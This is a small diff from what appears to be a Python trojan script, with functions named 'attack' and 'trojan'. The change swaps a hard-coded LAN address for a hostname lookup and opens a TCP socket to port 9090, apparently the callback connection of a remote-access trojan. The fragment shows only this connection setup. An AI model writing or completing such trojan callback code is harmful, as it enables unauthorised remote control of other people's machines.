@@ -51,7 +51,8 @@ def attack():
 """
 
 def trojan():
-    HOST = '192.168.68.110'
+    hostname = "Cosmes-MBP"
+    HOST = socket.gethostbyname(hostname)
     PORT = 9090
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
